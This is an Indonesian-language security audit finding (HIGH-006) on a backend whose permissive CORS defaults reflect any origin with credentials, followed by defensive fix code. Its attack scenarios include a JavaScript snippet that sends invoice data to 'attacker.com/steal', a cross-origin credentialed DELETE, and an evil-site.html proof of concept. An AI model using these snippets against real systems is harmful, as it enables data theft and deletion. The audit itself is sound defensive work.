# HIGH-006 — CORS Default `["*"]` + `credentials=True`

![Severity](https://img.shields.io/badge/Severity-HIGH-red)
![Module](https://img.shields.io/badge/Module-CORS%20%2F%20Security-orange)
![Status](https://img.shields.io/badge/Status-Open-critical)

---

## Table of Contents

1. [Executive Summary](#executive-summary)
2. [Technical Analysis](#technical-analysis)
3. [Business Impact](#business-impact)
4. [Real Use Case Scenario](#real-use-case-scenario)
5. [Root Cause Analysis](#root-cause-analysis)
6. [Evidence / Code Reference](#evidence--code-reference)
7. [Reproduction / Testing Steps](#reproduction--testing-steps)
8. [Risk Assessment](#risk-assessment)
9. [Recommended Fix](#recommended-fix)
10. [Refactor Recommendation](#refactor-recommendation)
11. [Long-Term Improvement Recommendation](#long-term-improvement-recommendation)

---

## Executive Summary

Konfigurasi CORS (Cross-Origin Resource Sharing) backend menggunakan **`allow_origins=["*"]` sebagai default** dengan **`allow_credentials=True`**. Kombinasi ini adalah:

1. **Pelanggaran spesifikasi CORS** — Browser akan menolak request dengan `credentials=True` jika `Access-Control-Allow-Origin: *` (wildcard dan credentials tidak bisa dipakai bersamaan)
2. **Risiko di production** — Jika `CORS_ORIGINS` tidak di-set di environment variables production, semua origin akan diizinkan
3. **Tidak ada startup validation** — Aplikasi akan berjalan dan menerima request dari origin manapun tanpa warning

---

## Technical Analysis

### Default Konfigurasi yang Bermasalah

```python
# app/core/config.py
class Settings(BaseSettings):
    # CORS — default sangat permisif
    cors_origins: list[str] = Field(default=["*"], alias="CORS_ORIGINS")
    cors_allow_credentials: bool = Field(default=True, alias="CORS_ALLOW_CREDENTIALS")
    cors_allow_methods: list[str] = Field(default=["*"], alias="CORS_ALLOW_METHODS")
    cors_allow_headers: list[str] = Field(default=["*"], alias="CORS_ALLOW_HEADERS")
```

```python
# app/main.py
app.add_middleware(
    CORSMiddleware,
    allow_origins=settings.cors_origins,           # ["*"] jika tidak di-set
    allow_credentials=settings.cors_allow_credentials,  # True
    allow_methods=settings.cors_allow_methods,
    allow_headers=settings.cors_allow_headers,
)
```

### Mengapa Kombinasi `["*"]` + `credentials=True` Berbahaya

**Dari spesifikasi CORS (MDN Web Docs):**

> When the request's credentials mode is "include", browsers will only expose the response to the frontend JavaScript code if the `Access-Control-Allow-Origin` value is NOT a wildcard `*` and the `Access-Control-Allow-Credentials` header value is `true`.

**Artinya:**

- Jika origin eksplisit (misal `https://app.kpc.co.id`) + credentials=True → ✅ Valid dan aman
- Jika origin wildcard `*` + credentials=False → ✅ Valid (tapi tidak bisa pakai cookies/auth)
- Jika origin wildcard `*` + credentials=True → ❌ Browser akan blokir, DAN ini konfigurasi tidak valid per spec

**Namun:** Starlette's `CORSMiddleware` akan **otomatis mengubah wildcard `*` menjadi origin yang dikirim request** jika `credentials=True`. Ini artinya semua origin tetap diizinkan, hanya header yang berubah dari `*` ke spesifik origin requester — **efektifnya sama dengan mengizinkan semua origin**.

```python
# Behavior Starlette CORSMiddleware dengan allow_origins=["*"] + allow_credentials=True:
# Request dari: https://attacker.com
# Response header: Access-Control-Allow-Origin: https://attacker.com  ← di-reflect
#                  Access-Control-Allow-Credentials: true
# Efek: Semua origin diizinkan, termasuk attacker
```

---

## Business Impact

| Dampak                        | Deskripsi                                                                                  |
| ----------------------------- | ------------------------------------------------------------------------------------------ |
| **CSRF via third-party site** | Website attacker bisa membuat request ke API backend menggunakan kredensial user           |
| **Data theft dari browser**   | Attacker bisa membaca response API dari halaman attacker jika user sedang login            |
| **Cookie-based auth bypass**  | Jika migrasi ke HttpOnly cookie (HIGH-003 fix), CORS wildcard akan membatalkan keamanannya |
| **Regulasi & compliance**     | CORS eksplisit adalah requirement dari banyak standar keamanan (SOC 2, ISO 27001)          |
| **False sense of security**   | Team percaya CORS sudah dikonfigurasi, padahal default tidak membatasi apapun              |

---

## Real Use Case Scenario

### Skenario 1: CSRF Attack via Malicious Website

```
Pre-condition: CORS wildcard aktif + future migrasi ke cookie auth

1. User login ke https://kpc-app.kpc.co.id → browser menyimpan HttpOnly cookie
2. User tanpa sadar membuka https://attacker-site.com (misalnya dari phishing email)
3. Halaman attacker menjalankan JavaScript:

   fetch('https://api.kpc.co.id/api/v1/contracts', {
     method: 'DELETE',
     credentials: 'include'  // ← cookie user ikut dikirim
   })

4. Karena CORS mengizinkan semua origin dan credentials=True:
   - Browser mengirim request dengan cookie user
   - Server memproses DELETE sebagai request legitimate dari user
   - Data terhapus
```

### Skenario 2: Production Deploy Tanpa Environment Variable

```
1. Developer baru deploy ke server production baru
2. Lupa set CORS_ORIGINS di environment variables
3. Aplikasi berjalan dengan default cors_origins=["*"]
4. Tidak ada error, tidak ada warning
5. Semua origin bisa akses API production
```

### Skenario 3: Data Read dari Third-Party Site

```
1. User sedang login ke kpc-app (token di localStorage)
2. User membuka evil-site.com di tab lain (phishing)
3. Evil site JavaScript:

   const token = /* asumsi bisa dapat via XSS */
   fetch('https://api.kpc.co.id/api/v1/invoices', {
     headers: { 'Authorization': 'Bearer ' + token }
   })
   .then(r => r.json())
   .then(data => fetch('https://attacker.com/steal', {
     method: 'POST', body: JSON.stringify(data)
   }))

4. Karena CORS mengizinkan, response invoice data dikirim ke attacker
```

---

## Root Cause Analysis

**Tipe masalah:** Insecure default configuration — fail-open instead of fail-secure

**Akar masalah:**

1. Default `cors_origins=["*"]` adalah fail-open: jika env var tidak di-set, sistem mengizinkan semua origin
2. Tidak ada startup validation yang memverifikasi CORS_ORIGINS telah di-set ke nilai yang aman di non-development environment
3. `credentials=True` hardcoded sebagai default tanpa mempertimbangkan kombinasi dengan wildcard origin
4. `env.example` tidak memberikan contoh nilai yang tepat untuk production

---

## Evidence / Code Reference

| Item        | Detail                                                                        |
| ----------- | ----------------------------------------------------------------------------- |
| **File**    | `app/core/config.py` — `cors_origins = Field(default=["*"], ...)`             |
| **File**    | `app/core/config.py` — `cors_allow_credentials = Field(default=True, ...)`    |
| **File**    | `app/main.py` — `CORSMiddleware(allow_origins=settings.cors_origins, ...)`    |
| **File**    | `env.example` — perlu dicek apakah CORS_ORIGINS dicontohkan dengan nilai aman |
| **Missing** | Tidak ada startup validation untuk CORS configuration                         |

---

## Reproduction / Testing Steps

### Verifikasi CORS Header

```bash
# Kirim request dengan Origin dari domain yang tidak dikenal
curl -v -X OPTIONS "http://localhost:8000/api/v1/activity-logs" \
  -H "Origin: https://evil-site.com" \
  -H "Access-Control-Request-Method: GET" \
  -H "Access-Control-Request-Headers: Authorization"

# Expected (secure): Access-Control-Allow-Origin header TIDAK ADA atau 403
# Actual (masalah):  Access-Control-Allow-Origin: https://evil-site.com (di-reflect)
#                   Access-Control-Allow-Credentials: true
```

### Verifikasi Default Value

```bash
# Set env tanpa CORS_ORIGINS, lalu cek konfigurasi aktif
env -u CORS_ORIGINS python3 -c "
from app.core.config import settings
print('CORS Origins:', settings.cors_origins)
print('CORS Credentials:', settings.cors_allow_credentials)
"
# Output: CORS Origins: ['*']
#         CORS Credentials: True
```

### Simulasi CSRF dari Browser

```html
<!-- Buka file HTML ini di browser saat user sedang login ke aplikasi -->
<!-- evil-site.html -->
<script>
  fetch("http://localhost:8000/api/v1/activity-logs", {
    method: "GET",
    credentials: "include",
    headers: { Authorization: "Bearer " + localStorage.getItem("token") },
  })
    .then((r) => r.json())
    .then((data) => {
      console.log("Berhasil akses data dari origin berbeda:", data);
      // Dalam skenario nyata: kirim ke server attacker
    });
</script>

<!-- Expected (secure): Blocked by CORS policy -->
<!-- Actual (masalah): Data ter-return ke evil site -->
```

---

## Risk Assessment

| Aspek                         | Nilai                                                               |
| ----------------------------- | ------------------------------------------------------------------- |
| **Severity**                  | HIGH                                                                |
| **Urgency**                   | HIGH — konfigurasi default yang tidak aman bisa terjadi sekarang    |
| **Likelihood**                | HIGH — cukup lupa set env var untuk mengaktifkan masalah ini        |
| **Impact if not fixed**       | CSRF attacks, data theft, tidak compliant dengan security standards |
| **Estimated Fix Complexity**  | LOW — perubahan konfigurasi dan tambah startup validation           |
| **Estimated Production Risk** | HIGH — security dan compliance risk                                 |

---

## Recommended Fix

### 1. Ubah Default CORS ke Restrictive

```python
# app/core/config.py
cors_origins: list[str] = Field(
    default=[],  # ← Default kosong, BUKAN ["*"]
    alias="CORS_ORIGINS"
)
```

### 2. Tambahkan Startup Validation

```python
# app/core/config.py
from pydantic import model_validator

class Settings(BaseSettings):
    ...

    @model_validator(mode="after")
    def validate_cors_for_production(self) -> "Settings":
        if self.environment not in ("development", "test"):
            if "*" in self.cors_origins or not self.cors_origins:
                raise ValueError(
                    "CORS_ORIGINS must be set to explicit frontend domains in production. "
                    f"Current value: {self.cors_origins}"
                )
        return self
```

### 3. Update env.example dengan Nilai yang Tepat

```bash
# env.example
# CORS — Ganti dengan domain frontend yang sebenarnya
# Development: boleh lebih permisif
CORS_ORIGINS=["http://localhost:3000","http://localhost:5173"]
CORS_ALLOW_CREDENTIALS=true

# Production: HARUS spesifik
# CORS_ORIGINS=["https://app.kpc.co.id","https://admin.kpc.co.id"]
```

### 4. Update main.py untuk Strict Mode di Production

```python
# app/main.py
if settings.environment == "production" and "*" in settings.cors_origins:
    app_logger.critical(
        "CRITICAL SECURITY WARNING: CORS_ORIGINS is set to ['*'] in production! "
        "All origins are allowed. Set CORS_ORIGINS to explicit frontend domains."
    )
    raise RuntimeError("Cannot start application with CORS wildcard in production")

app.add_middleware(
    CORSMiddleware,
    allow_origins=settings.cors_origins,
    allow_credentials=settings.cors_allow_credentials,
    allow_methods=settings.cors_allow_methods,
    allow_headers=settings.cors_allow_headers,
)
```

---

## Refactor Recommendation

1. Pisahkan konfigurasi CORS per environment: `cors_origins_dev`, `cors_origins_prod`
2. Tambahkan CI/CD check yang memverifikasi `CORS_ORIGINS` tidak mengandung `*` untuk production deployment
3. Buat helper `is_origin_allowed(origin: str) -> bool` untuk konsistensi

---

## Long-Term Improvement Recommendation

1. **Dynamic CORS** — Simpan allowed origins di database, bisa dikonfigurasi via admin panel tanpa restart aplikasi
2. **Security headers** — Tambahkan middleware untuk headers keamanan lainnya: `X-Frame-Options`, `X-Content-Type-Options`, `Strict-Transport-Security`
3. **CORS audit logging** — Log request yang ditolak CORS untuk deteksi serangan lebih dini
4. **CSP header** — Tambahkan Content-Security-Policy untuk proteksi berlapis

---

_Related Finding: HIGH-003 (JWT localStorage — CORS yang buruk memperparah ini), HIGH-002_
_Related API: Semua endpoint `/api/_`*
*Related File: `app/core/config.py`, `app/main.py`, `env.example`\*
